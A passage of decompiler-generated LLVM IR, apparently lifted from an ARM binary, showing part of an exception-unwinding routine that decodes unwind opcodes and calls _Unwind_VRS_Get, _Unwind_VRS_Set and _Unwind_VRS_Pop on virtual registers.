  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_1ad74 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1ad74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1abec.backedge

dec_label_pc_1abec.backedge:                      ; preds = %dec_label_pc_1ad20, %dec_label_pc_1ad9c, %dec_label_pc_1b220, %dec_label_pc_1aeec, %dec_label_pc_1af24, %dec_label_pc_1aea4, %dec_label_pc_1b110
  %v0_1abec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1abec

dec_label_pc_1ad7c:                               ; preds = %dec_label_pc_1ac4c
  %v7_1ad7c = icmp eq i32 %v1_1ac4c, 144
  store i1 %v7_1ad7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ad7c, label %dec_label_pc_1ad84, label %dec_label_pc_1aec4

dec_label_pc_1ad84:                               ; preds = %dec_label_pc_1ad7c
  %v1_1ad84 = urem i32 %v0_1ac44, 16
  store i32 %v1_1ad84, i32* %r2.global-to-local, align 4
  %v2_1ad88 = icmp eq i32 %v1_1ad84, 15
  store i1 %v2_1ad88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad88, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_1ad84
  %v8_1ad8c = icmp eq i32 %v1_1ad84, 13
  store i1 %v8_1ad8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1ad8c, label %bb154, label %dec_label_pc_1ad9c

.thread21:                                        ; preds = %dec_label_pc_1ad84
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1aebc

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1aebc

dec_label_pc_1ad9c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1ada8 = load i32, i32* @r7, align 4
  store i32 %v0_1ada8, i32* %r0.global-to-local, align 4
  %v5_1adb0 = call i32 @_Unwind_VRS_Get(i32 %v0_1ada8, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1adb8 = load i32, i32* @r7, align 4
  store i32 %v0_1adb8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_1adc8 = call i32 @_Unwind_VRS_Set(i32 %v0_1adb8, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1adc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1abec.backedge

dec_label_pc_1add0:                               ; preds = %dec_label_pc_1ad08
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1ade0 = load i32, i32* @r7, align 4
  store i32 %v0_1ade0, i32* %r0.global-to-local, align 4
  %v7_1ade8 = call i32 @_Unwind_VRS_Get(i32 %v0_1ade0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1adec = load i32, i32* @r7, align 4
  store i32 %v0_1adec, i32* %r0.global-to-local, align 4
  %v0_1adf0 = load i32, i32* @sl, align 4
  store i32 %v0_1adf0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_1adf0, i32* %r3.global-to-local, align 4
  %v5_1ae00 = call i32 @_Unwind_VRS_Set(i32 %v0_1adec, i32 %v0_1adf0, i32 15, i32 %v0_1adf0, i8* bitcast (i32* @0 to i8*))
  %v0_1ae04 = load i32, i32* @sl, align 4
  store i32 %v0_1ae04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad14

dec_label_pc_1ae0c:                               ; preds = %dec_label_pc_1b000
  %v7_1ae0c = icmp eq i32 %v0_1b000, 199
  store i1 %v7_1ae0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ae0c, label %dec_label_pc_1b0e0, label %dec_label_pc_1ae14

dec_label_pc_1ae14:                               ; preds = %dec_label_pc_1ae0c
  %v1_1ae14 = and i32 %v0_1ac44, 248
  store i32 %v1_1ae14, i32* %r3.global-to-local, align 4
  %v7_1ae18 = icmp eq i32 %v1_1ae14, 192
  store i1 %v7_1ae18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ae18, label %.thread24, label %dec_label_pc_1ae30

.thread24:                                        ; preds = %dec_label_pc_1ae14
  %v2_1ae1c = urem i32 %v0_1ac44, 16
  %v2_1ae20 = add nuw nsw i32 %v2_1ae1c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1ae28 = or i32 %v2_1ae20, 655360
  store i32 %v2_1ae28, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aeec

dec_label_pc_1ae30:                               ; preds = %dec_label_pc_1ae14
  %v7_1ae30 = icmp eq i32 %v0_1b000, 200
  store i1 %v7_1ae30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ae30, label %dec_label_pc_1b074, label %dec_label_pc_1ae38

dec_label_pc_1ae38:                               ; preds = %dec_label_pc_1ae30
  %v7_1ae38 = icmp eq i32 %v0_1b000, 201
  store i1 %v7_1ae38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ae38, label %dec_label_pc_1ae40, label %dec_label_pc_1aebc

dec_label_pc_1ae40:                               ; preds = %dec_label_pc_1ae38
  %v0_1ae40 = load i32, i32* @r5, align 4
  %v1_1ae40 = add i32 %v0_1ae40, 8
  %v2_1ae40 = inttoptr i32 %v1_1ae40 to i8*
  %v3_1ae40 = load i8, i8* %v2_1ae40, align 1
  %v4_1ae40 = zext i8 %v3_1ae40 to i32
  store i32 %v4_1ae40, i32* %r3.global-to-local, align 4
  %v2_1ae44 = icmp eq i8 %v3_1ae40, 0
  store i1 %v2_1ae44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ae44, label %dec_label_pc_1ae54, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_1ae40
  %v2_1ae48 = add nsw i32 %v4_1ae40, -1
  store i32 %v2_1ae48, i32* %r3.global-to-local, align 4
  %v2_1ae4c = trunc i32 %v2_1ae48 to i8
  store i8 %v2_1ae4c, i8* %v2_1ae40, align 1
  %v0_1ae50.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ae50.pr.pr, label %.thread26.dec_label_pc_1ae54_crit_edge, label %dec_label_pc_1ae88

.thread26.dec_label_pc_1ae54_crit_edge:           ; preds = %.thread26
  %v0_1ae54.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ae54

dec_label_pc_1ae54:                               ; preds = %.thread26.dec_label_pc_1ae54_crit_edge, %dec_label_pc_1ae40
  %v2_1ae6c = phi i32 [ %v0_1ae54.pre, %.thread26.dec_label_pc_1ae54_crit_edge ], [ %v0_1ae40, %dec_label_pc_1ae40 ]
  %v1_1ae54 = add i32 %v2_1ae6c, 9
  %v2_1ae54 = inttoptr i32 %v1_1ae54 to i8*
  %v3_1ae54 = load i8, i8* %v2_1ae54, align 1
  %v4_1ae54 = zext i8 %v3_1ae54 to i32
  store i32 %v4_1ae54, i32* %r3.global-to-local, align 4
  %v2_1ae58 = icmp eq i8 %v3_1ae54, 0
  store i1 %v2_1ae58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ae58, label %dec_label_pc_1aea4, label %dec_label_pc_1ae68

dec_label_pc_1ae68:                               ; preds = %dec_label_pc_1ae54
  %v1_1ae68 = add nsw i32 %v4_1ae54, -1
  store i32 %v1_1ae68, i32* %r3.global-to-local, align 4
  %v1_1ae6c = trunc i32 %v1_1ae68 to i8
  store i8 %v1_1ae6c, i8* %v2_1ae54, align 1
  %v0_1ae70 = load i32, i32* @r5, align 4
  %v1_1ae70 = add i32 %v0_1ae70, 4
  %v2_1ae70 = inttoptr i32 %v1_1ae70 to i32*
  %v3_1ae70 = load i32, i32* %v2_1ae70, align 4
  store i32 %v3_1ae70, i32* %r2.global-to-local, align 4
  %v1_1ae74 = inttoptr i32 %v3_1ae70 to i32*
  %v2_1ae74 = load i32, i32* %v1_1ae74, align 4
  store i32 %v2_1ae74, i32* %r0.global-to-local, align 4
  %v4_1ae74 = add i32 %v3_1ae70, 4
  store i32 %v4_1ae74, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1ae74, i32* %v2_1ae70, align 4
  %v0_1ae80 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ae80 = trunc i32 %v0_1ae80 to i8
  %v2_1ae80 = load i32, i32* @r5, align 4
  %v3_1ae80 = add i32 %v2_1ae80, 8
  %v4_1ae80 = inttoptr i32 %v3_1ae80 to i8*
  store i8 %v1_1ae80, i8* %v4_1ae80, align 1
  %v0_1ae84 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ae84 = load i32, i32* @r5, align 4
  %v2_1ae84 = inttoptr i32 %v1_1ae84 to i32*
  store i32 %v0_1ae84, i32* %v2_1ae84, align 4
  br label %dec_label_pc_1ae88

dec_label_pc_1ae88:                               ; preds = %.thread26, %dec_label_pc_1ae68
  %v0_1ae88 = load i32, i32* %r0.global-to-local, align 4
  %v3_1ae88 = udiv i32 %v0_1ae88, 16777216
  %v1_1ae8c = urem i32 %v3_1ae88, 16
  %v3_1ae90 = mul i32 %v0_1ae88, 256
  %v1_1ae94 = add nuw nsw i32 %v1_1ae8c, 1
  store i32 %v1_1ae94, i32* %r1.global-to-local, align 4
  %v1_1ae98 = and i32 %v3_1ae88, 240
  store i32 %v1_1ae98, i32* %r3.global-to-local, align 4
  %v1_1ae9c = load i32, i32* @r5, align 4
  %v2_1ae9c = inttoptr i32 %v1_1ae9c to i32*
  store i32 %v3_1ae90, i32* %v2_1ae9c, align 4
  %v0_1aea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aea0 = load i32, i32* %r3.global-to-local, align 4
  %v4_1aea0 = mul i32 %v1_1aea0, 4096
  %v5_1aea0 = or i32 %v4_1aea0, %v0_1aea0
  br label %dec_label_pc_1aea4

dec_label_pc_1aea4:                               ; preds = %dec_label_pc_1ae54, %dec_label_pc_1ae88
  %storemerge = phi i32 [ %v5_1aea0, %dec_label_pc_1ae88 ], [ 720897, %dec_label_pc_1ae54 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_1aea4 = load i32, i32* @r7, align 4
  store i32 %v0_1aea4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1aeb0 = call i32 @_Unwind_VRS_Pop(i32 %v0_1aea4, i32 1, i32 5, i32 5)
  store i32 %v4_1aeb0, i32* %r0.global-to-local, align 4
  %v2_1aeb4 = icmp eq i32 %v4_1aeb0, 0
  store i1 %v2_1aeb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aeb4, label %dec_label_pc_1abec.backedge, label %dec_label_pc_1aebc

dec_label_pc_1aebc:                               ; preds = %dec_label_pc_1b108, %dec_label_pc_1ae38, %dec_label_pc_1af18, %dec_label_pc_1b2bc, %dec_label_pc_1b28c, %dec_label_pc_1b268, %dec_label_pc_1b0f4, %dec_label_pc_1aea4, %dec_label_pc_1acb8, %dec_label_pc_1acac, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad14

dec_label_pc_1aec4:                               ; preds = %dec_label_pc_1ad7c
  %v7_1aec4 = icmp eq i32 %v1_1ac4c, 160
  store i1 %v7_1aec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1aec4, label %dec_label_pc_1aecc, label %dec_label_pc_1af08

dec_label_pc_1aecc:                               ; preds = %dec_label_pc_1aec4
  %v0_1aecc = load i32, i32* %ip.global-to-local, align 4
  %v1_1aecc = urem i32 %v0_1aecc, 8
  %v1_1aed0 = xor i32 %v1_1aecc, 7
  store i32 %v1_1aed0, i32* %r3.global-to-local, align 4
  %v6_1aed8 = lshr i32 4080, %v1_1aed0
  %v1_1aedc = and i32 %v0_1ac44, 8
  %v2_1aedc = icmp eq i32 %v1_1aedc, 0
  store i1 %v2_1aedc, i1* %cpsr_z.global-to-local, align 1
  %v1_1aee0 = and i32 %v6_1aed8, 4080
  %tmp155 = mul nuw nsw i32 %v1_1aedc, 2048
  %tmp156 = or i32 %v1_1aee0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aeec

dec_label_pc_1aeec:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1b27c.dec_label_pc_1aeec_crit_edge, %bb157, %dec_label_pc_1b0d8, %dec_label_pc_1b06c, %dec_label_pc_1afcc, %dec_label_pc_1aecc
  %v2_1aef4 = phi i32 [ %v2_1aff0, %.thread44 ], [ %v2_1aff8, %bb157 ], [ %v2_1aef4.pre, %dec_label_pc_1b27c.dec_label_pc_1aeec_crit_edge ], [ %v2_1ae28, %.thread24 ], [ %storemerge130, %dec_label_pc_1b0d8 ], [ %storemerge131, %dec_label_pc_1b06c ], [ %storemerge132, %dec_label_pc_1afcc ], [ %tmp156, %dec_label_pc_1aecc ]
  %v0_1aef0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1b27c.dec_label_pc_1aeec_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_1b0d8 ], [ 3, %dec_label_pc_1b06c ], [ 1, %dec_label_pc_1afcc ], [ 0, %dec_label_pc_1aecc ]
  %v0_1aeec = load i32, i32* @r7, align 4
  store i32 %v0_1aeec, i32* %r0.global-to-local, align 4
  store i32 %v0_1aef0, i32* %r3.global-to-local, align 4
  %v4_1aef4 = call i32 @_Unwind_VRS_Pop(i32 %v0_1aeec, i32 %v0_1aef0, i32 %v2_1aef4, i32 %v0_1aef0)
  store i32 %v4_1aef4, i32* %r0.global-to-local, align 4
  %v2_1aef8 = icmp eq i32 %v4_1aef4, 0
  store i1 %v2_1aef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aef8, label %dec_label_pc_1abec.backedge, label %dec_label_pc_1af00

dec_label_pc_1af00:                               ; preds = %dec_label_pc_1aeec
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad14

dec_label_pc_1af08:                               ; preds = %dec_label_pc_1aec4
  %v7_1af08 = icmp eq i32 %v1_1ac4c, 176
  store i1 %v7_1af08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af08, label %dec_label_pc_1af50, label %dec_label_pc_1af10

dec_label_pc_1af10:                               ; preds = %dec_label_pc_1af08
  %v7_1af10 = icmp eq i32 %v1_1ac4c, 192
  store i1 %v7_1af10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af10, label %dec_label_pc_1b000, label %dec_label_pc_1af18

dec_label_pc_1af18:                               ; preds = %dec_label_pc_1af10
  %v1_1af18 = and i32 %v0_1ac44, 248
  store i32 %v1_1af18, i32* %r3.global-to-local, align 4
  %v7_1af1c = icmp eq i32 %v1_1af18, 208
  store i1 %v7_1af1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af1c, label %dec_label_pc_1af24, label %dec_label_pc_1aebc

dec_label_pc_1af24:                               ; preds = %dec_label_pc_1af18
  %v1_1af24 = urem i32 %v0_1ac44, 8
  %v1_1af28 = add nuw nsw i32 %v1_1af24, 1
  %v1_1af2c = or i32 %v1_1af28, 524288
  store i32 %v1_1af2c, i32* %r2.global-to-local, align 4
  %v0_1af30 = load i32, i32* @r7, align 4
  store i32 %v0_1af30, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1af3c = call i32 @_Unwind_VRS_Pop(i32 %v0_1af30, i32 1, i32 %v1_1af2c, i32 5)
  store i32 %v4_1af3c, i32* %r0.global-to-local, align 4
  %v2_1af40 = icmp eq i32 %v4_1af3c, 0
  store i1 %v2_1af40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1af40, label %dec_label_pc_1abec.backedge, label %dec_label_pc_1af48

dec_label_pc_1af48:                               ; preds = %dec_label_pc_1af24
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad14

dec_label_pc_1af50:                               ; preds = %dec_label_pc_1af08
  %v0_1af50 = load i32, i32* %ip.global-to-local, align 4
  %v7_1af50 = icmp eq i32 %v0_1af50, 177
  store i1 %v7_1af50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af50, label %dec_label_pc_1b254, label %dec_label_pc_1af58

dec_label_pc_1af58:                               ; preds = %dec_label_pc_1af50
  %v7_1af58 = icmp eq i32 %v0_1af50, 178
  store i1 %v7_1af58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af58, label %dec_label_pc_1b12c, label %dec_label_pc_1af60

dec_label_pc_1af60:                               ; preds = %dec_label_pc_1af58
  %v7_1af60 = icmp eq i32 %v0_1af50, 179
  store i1 %v7_1af60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af60, label %dec_label_pc_1af68, label %dec_label_pc_1afd4

dec_label_pc_1af68:                               ; preds = %dec_label_pc_1af60
  %v0_1af68 = load i32, i32* @r5, align 4
  %v1_1af68 = add i32 %v0_1af68, 8
  %v2_1af68 = inttoptr i32 %v1_1af68 to i8*
  %v3_1af68 = load i8, i8* %v2_1af68, align 1
  %v4_1af68 = zext i8 %v3_1af68 to i32
  store i32 %v4_1af68, i32* %r3.global-to-local, align 4
  %v2_1af6c = icmp eq i8 %v3_1af68, 0
  store i1 %v2_1af6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1af6c, label %dec_label_pc_1af7c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_1af68
  %v2_1af70 = add nsw i32 %v4_1af68, -1
  store i32 %v2_1af70, i32* %r3.global-to-local, align 4
  %v2_1af74 = trunc i32 %v2_1af70 to i8
  store i8 %v2_1af74, i8* %v2_1af68, align 1
  %v0_1af78.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1af78.pr.pr, label %.thread30.dec_label_pc_1af7c_crit_edge, label %dec_label_pc_1afb0

.thread30.dec_label_pc_1af7c_crit_edge:           ; preds = %.thread30
  %v0_1af7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1af7c

dec_label_pc_1af7c:                               ; preds = %.thread30.dec_label_pc_1af7c_crit_edge, %dec_label_pc_1af68
  %v2_1af94 = phi i32 [ %v0_1af7c.pre, %.thread30.dec_label_pc_1af7c_crit_edge ], [ %v0_1af68, %dec_label_pc_1af68 ]
  %v1_1af7c = add i32 %v2_1af94, 9
  %v2_1af7c = inttoptr i32 %v1_1af7c to i8*
  %v3_1af7c = load i8, i8* %v2_1af7c, align 1
  %v4_1af7c = zext i8 %v3_1af7c to i32
  store i32 %v4_1af7c, i32* %r3.global-to-local, align 4
  %v2_1af80 = icmp eq i8 %v3_1af7c, 0
  store i1 %v2_1af80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1af80, label %dec_label_pc_1afcc, label %dec_label_pc_1af90

dec_label_pc_1af90:                               ; preds = %dec_label_pc_1af7c
  %v1_1af90 = add nsw i32 %v4_1af7c, -1
  store i32 %v1_1af90, i32* %r3.global-to-local, align 4
  %v1_1af94 = trunc i32 %v1_1af90 to i8
  store i8 %v1_1af94, i8* %v2_1af7c, align 1
  %v0_1af98 = load i32, i32* @r5, align 4
  %v1_1af98 = add i32 %v0_1af98, 4
  %v2_1af98 = inttoptr i32 %v1_1af98 to i32*
  %v3_1af98 = load i32, i32* %v2_1af98, align 4
  store i32 %v3_1af98, i32* %r2.global-to-local, align 4
  %v1_1af9c = inttoptr i32 %v3_1af98 to i32*
  %v2_1af9c = load i32, i32* %v1_1af9c, align 4
  store i32 %v2_1af9c, i32* %r0.global-to-local, align 4
  %v4_1af9c = add i32 %v3_1af98, 4
  store i32 %v4_1af9c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1af9c, i32* %v2_1af98, align 4
  %v0_1afa8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1afa8 = trunc i32 %v0_1afa8 to i8
  %v2_1afa8 = load i32, i32* @r5, align 4
  %v3_1afa8 = add i32 %v2_1afa8, 8
  %v4_1afa8 = inttoptr i32 %v3_1afa8 to i8*
  store i8 %v1_1afa8, i8* %v4_1afa8, align 1
  %v0_1afac = load i32, i32* %r0.global-to-local, align 4
  %v1_1afac = load i32, i32* @r5, align 4
  %v2_1afac = inttoptr i32 %v1_1afac to i32*
  store i32 %v0_1afac, i32* %v2_1afac, align 4
  br label %dec_label_pc_1afb0

dec_label_pc_1afb0:                               ; preds = %.thread30, %dec_label_pc_1af90
  %v0_1afb0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1afb0 = udiv i32 %v0_1afb0, 16777216
  %v1_1afb4 = urem i32 %v3_1afb0, 16
  %v3_1afb8 = mul i32 %v0_1afb0, 256
  store i32 %v3_1afb8, i32* %r0.global-to-local, align 4
  %v1_1afbc = add nuw nsw i32 %v1_1afb4, 1
  store i32 %v1_1afbc, i32* %r2.global-to-local, align 4
  %v1_1afc0 = and i32 %v3_1afb0, 240
  store i32 %v1_1afc0, i32* %r3.global-to-local, align 4
  %v1_1afc4 = load i32, i32* @r5, align 4
  %v2_1afc4 = inttoptr i32 %v1_1afc4 to i32*
  store i32 %v3_1afb8, i32* %v2_1afc4, align 4
  %v0_1afc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1afc8 = load i32, i32* %r3.global-to-local, align 4
  %v4_1afc8 = mul i32 %v1_1afc8, 4096
  %v5_1afc8 = or i32 %v4_1afc8, %v0_1afc8
  br label %dec_label_pc_1afcc

dec_label_pc_1afcc:                               ; preds = %dec_label_pc_1af7c, %dec_label_pc_1afb0
  %storemerge132 = phi i32 [ %v5_1afc8, %dec_label_pc_1afb0 ], [ 720897, %dec_label_pc_1af7c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aeec

dec_label_pc_1afd4:                               ; preds = %dec_label_pc_1af60
  %v1_1afd4 = and i32 %v0_1ac44, 252
  store i32 %v1_1afd4, i32* %r3.global-to-local, align 4
  %v7_1afd8 = icmp eq i32 %v1_1afd4, 180
  store i1 %v7_1afd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1afd8, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_1afd4
  %v2_1afdc = urem i32 %v0_1ac44, 4
  %v2_1afe4 = add nuw nsw i32 %v2_1afdc, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_1aff0 = or i32 %v2_1afe4, 262144
  store i32 %v2_1aff0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aeec

bb157:                                            ; preds = %dec_label_pc_1afd4
  %v2_1afe0 = urem i32 %v0_1af50, 8
  %v2_1afe8 = add nuw nsw i32 %v2_1afe0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1aff8 = or i32 %v2_1afe8, 524288
  store i32 %v2_1aff8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aeec

dec_label_pc_1b000:                               ; preds = %dec_label_pc_1af10
  %v0_1b000 = load i32, i32* %ip.global-to-local, align 4
  %v7_1b000 = icmp eq i32 %v0_1b000, 198
  store i1 %v7_1b000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b000, label %dec_label_pc_1b008, label %dec_label_pc_1ae0c

dec_label_pc_1b008:                               ; preds = %dec_label_pc_1b000
  %v0_1b008 = load i32, i32* @r5, align 4
  %v1_1b008 = add i32 %v0_1b008, 8
  %v2_1b008 = inttoptr i32 %v1_1b008 to i8*
  %v3_1b008 = load i8, i8* %v2_1b008, align 1
  %v4_1b008 = zext i8 %v3_1b008 to i32
  store i32 %v4_1b008, i32* %r3.global-to-local, align 4
  %v2_1b00c = icmp eq i8 %v3_1b008, 0
  store i1 %v2_1b00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b00c, label %dec_label_pc_1b01c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_1b008
  %v2_1b010 = add nsw i32 %v4_1b008, -1
  store i32 %v2_1b010, i32* %r3.global-to-local, align 4
  %v2_1b014 = trunc i32 %v2_1b010 to i8
  store i8 %v2_1b014, i8* %v2_1b008, align 1
  %v0_1b018.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b018.pr.pr, label %.thread48.dec_label_pc_1b01c_crit_edge, label %dec_label_pc_1b050

.thread48.dec_label_pc_1b01c_crit_edge:           ; preds = %.thread48
  %v0_1b01c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b01c

dec_label_pc_1b01c:                               ; preds = %.thread48.dec_label_pc_1b01c_crit_edge, %dec_label_pc_1b008
  %v2_1b034 = phi i32 [ %v0_1b01c.pre, %.thread48.dec_label_pc_1b01c_crit_edge ], [ %v0_1b008, %dec_label_pc_1b008 ]
  %v1_1b01c = add i32 %v2_1b034, 9
  %v2_1b01c = inttoptr i32 %v1_1b01c to i8*
  %v3_1b01c = load i8, i8* %v2_1b01c, align 1
  %v4_1b01c = zext i8 %v3_1b01c to i32
  store i32 %v4_1b01c, i32* %r3.global-to-local, align 4
  %v2_1b020 = icmp eq i8 %v3_1b01c, 0
  store i1 %v2_1b020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b020, label %dec_label_pc_1b06c, label %dec_label_pc_1b030

dec_label_pc_1b030:                               ; preds = %dec_label_pc_1b01c
  %v1_1b030 = add nsw i32 %v4_1b01c, -1
  store i32 %v1_1b030, i32* %r3.global-to-local, align 4
  %v1_1b034 = trunc i32 %v1_1b030 to i8
  store i8 %v1_1b034, i8* %v2_1b01c, align 1
  %v0_1b038 = load i32, i32* @r5, align 4
  %v1_1b038 = add i32 %v0_1b038, 4
  %v2_1b038 = inttoptr i32 %v1_1b038 to i32*
  %v3_1b038 = load i32, i32* %v2_1b038, align 4
  store i32 %v3_1b038, i32* %r2.global-to-local, align 4
  %v1_1b03c = inttoptr i32 %v3_1b038 to i32*
  %v2_1b03c = load i32, i32* %v1_1b03c, align 4
  store i32 %v2_1b03c, i32* %r0.global-to-local, align 4
  %v4_1b03c = add i32 %v3_1b038, 4
  store i32 %v4_1b03c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1b03c, i32* %v2_1b038, align 4
  %v0_1b048 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b048 = trunc i32 %v0_1b048 to i8
  %v2_1b048 = load i32, i32* @r5, align 4
  %v3_1b048 = add i32 %v2_1b048, 8
  %v4_1b048 = inttoptr i32 %v3_1b048 to i8*
  store i8 %v1_1b048, i8* %v4_1b048, align 1
  %v0_1b04c = load i32, i32* %r0.global-to-local, align 4
  %v1_1b04c = load i32, i32* @r5, align 4
  %v2_1b04c = inttoptr i32 %v1_1b04c to i32*
  store i32 %v0_1b04c, i32* %v2_1b04c, align 4
  br label %dec_label_pc_1b050

dec_label_pc_1b050:                               ; preds = %.thread48, %dec_label_pc_1b030
  %v0_1b050 = load i32, i32* %r0.global-to-local, align 4
  %v3_1b050 = udiv i32 %v0_1b050, 16777216
  %v1_1b054 = urem i32 %v3_1b050, 16
  %v3_1b058 = mul i32 %v0_1b050, 256
  store i32 %v3_1b058, i32* %r0.global-to-local, align 4
  %v1_1b05c = add nuw nsw i32 %v1_1b054, 1
  store i32 %v1_1b05c, i32* %r2.global-to-local, align 4
  %v1_1b060 = and i32 %v3_1b050, 240
  store i32 %v1_1b060, i32* %r3.global-to-local, align 4
  %v1_1b064 = load i32, i32* @r5, align 4
  %v2_1b064 = inttoptr i32 %v1_1b064 to i32*
  store i32 %v3_1b058, i32* %v2_1b064, align 4
  %v0_1b068 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b068 = load i32, i32* %r3.global-to-local, align 4
  %v4_1b068 = mul i32 %v1_1b068, 4096
  %v5_1b068 = or i32 %v4_1b068, %v0_1b068
  br label %dec_label_pc_1b06c

dec_label_pc_1b06c:                               ; preds = %dec_label_pc_1b01c, %dec_label_pc_1b050
  %storemerge131 = phi i32 [ %v5_1b068, %dec_label_pc_1b050 ], [ 720897, %dec_label_pc_1b01c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aeec

dec_label_pc_1b074:                               ; preds = %dec_label_pc_1ae30
  %v0_1b074 = load i32, i32* @r5, align 4
  %v1_1b074 = add i32 %v0_1b074, 8
  %v2_1b074 = inttoptr i32 %v1_1b074 to i8*
  %v3_1b074 = load i8, i8* %v2_1b074, align 1
  %v4_1b074 = zext i8 %v3_1b074 to i32
  store i32 %v4_1b074, i32* %r3.global-to-local, align 4
  %v2_1b078 = icmp eq i8 %v3_1b074, 0
  store i1 %v2_1b078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b078, label %dec_label_pc_1b088, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_1b074
  %v2_1b07c = add nsw i32 %v4_1b074, -1
  store i32 %v2_1b07c, i32* %r3.global-to-local, align 4
  %v2_1b080 = trunc i32 %v2_1b07c to i8
  store i8 %v2_1b080, i8* %v2_1b074, align 1
  %v0_1b084.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
